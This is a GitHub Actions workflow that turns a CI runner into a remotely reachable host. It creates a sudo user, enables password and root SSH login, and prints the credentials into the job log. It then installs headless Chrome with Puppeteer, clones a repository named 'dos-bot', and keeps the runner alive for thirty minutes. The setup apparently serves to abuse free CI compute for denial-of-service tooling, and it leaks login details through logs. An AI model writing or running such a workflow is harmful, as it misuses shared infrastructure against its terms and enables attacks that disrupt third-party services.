name: VPS + Puppeteer SSH Access
on:
  workflow_dispatch:
jobs:
  deploy:
    runs-on: ubuntu-latest
    timeout-minutes: 60
    steps:
      - uses: actions/checkout@v4
      
      - name: System Optimization
        run: |
          sudo sysctl -w vm.swappiness=10
          sudo sysctl -w vm.vfs_cache_pressure=50
          sudo sysctl -w net.core.rmem_max=134217728
          sudo sysctl -w net.core.wmem_max=134217728
          sudo sysctl -w net.ipv4.tcp_rmem="4096 65536 134217728"
          sudo sysctl -w net.ipv4.tcp_wmem="4096 65536 134217728"
          sudo sysctl -w net.core.netdev_max_backlog=5000
          ulimit -n 65536
          sudo apt-get clean
          sudo apt-get autoremove -y
          
      - name: Install Dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y --no-install-recommends \
            wget unzip curl git ca-certificates gnupg lsb-release \
            fonts-liberation libx11-xcb1 libxcomposite1 libxcursor1 \
            libxdamage1 libxi6 libxtst6 libnss3 libxrandr2 libatk1.0-0 \
            libatk-bridge2.0-0 libcups2 libdbus-1-3 libdrm2 libxss1 \
            libgbm1 xdg-utils libasound2t64 libxshmfence1 openssh-server
            
      - name: Setup SSH Access
        run: |
          sudo systemctl start ssh
          sudo systemctl enable ssh
          
          USERNAME="vpsuser"
          PASSWORD="VPS$(date +%s | tail -c 6)$(shuf -i 100-999 -n 1)"
          PORT=22
          
          sudo useradd -m -s /bin/bash $USERNAME
          echo "$USERNAME:$PASSWORD" | sudo chpasswd
          sudo usermod -aG sudo $USERNAME
          
          sudo sed -i "s/#PasswordAuthentication yes/PasswordAuthentication yes/" /etc/ssh/sshd_config
          sudo sed -i "s/PasswordAuthentication no/PasswordAuthentication yes/" /etc/ssh/sshd_config
          sudo sed -i "s/#PermitRootLogin prohibit-password/PermitRootLogin yes/" /etc/ssh/sshd_config
          sudo systemctl restart ssh
          
          sudo ufw allow 22
          sudo ufw --force enable
          
          PUBLIC_IP=$(curl -s ifconfig.me)
          RUNNER_IP=$(hostname -I | awk '{print $1}')
          
          echo "========================================"
          echo "SSH ACCESS READY"
          echo "========================================"
          echo "Public IP: $PUBLIC_IP"
          echo "Runner IP: $RUNNER_IP"  
          echo "Port: $PORT"
          echo "Username: $USERNAME"
          echo "Password: $PASSWORD"
          echo "========================================"
          echo "Command: ssh $USERNAME@$PUBLIC_IP -p $PORT"
          echo "Backup: ssh $USERNAME@$RUNNER_IP -p $PORT"
          echo "========================================"
          
      - name: Install Chrome
        run: |
          wget -q -O google-chrome.deb https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
          sudo dpkg -i google-chrome.deb || sudo apt-get install -f -y
          
      - name: Install Node.js
        run: |
          curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
          sudo apt-get install -y nodejs
          npm config set registry https://registry.npmjs.org/
          npm config set fetch-retries 5
          npm config set fetch-retry-factor 2
          npm config set fetch-retry-mintimeout 10000
          npm config set fetch-retry-maxtimeout 60000
          
      - name: Install Puppeteer Dependencies
        run: |
          npm install --silent puppeteer-real-browser hpack
          git clone --depth 1 https://github.com/depchaiaiyeu/dos-bot
          cd dos-bot
          if [ -f "package.json" ]; then
            npm install --silent --production
          fi
          cd ..
          CURRENT_DIR=$(pwd)
          sudo chown -R vpsuser:vpsuser $CURRENT_DIR/dos-bot
          
      - name: Keep alive
        run: |
          start_time=$(date +%s)
          target_duration=1800
          
          while true; do
            current_time=$(date +%s)
            elapsed=$((current_time - start_time))
            remaining=$((target_duration - elapsed))
            
            if [ $remaining -le 0 ]; then
              break
            fi
            
            if [ $((elapsed % 300)) -eq 0 ]; then
              if [ $((elapsed % 600)) -eq 0 ]; then
                sync && echo 1 | sudo tee /proc/sys/vm/drop_caches > /dev/null
              fi
            fi
            
            sleep 30
          done
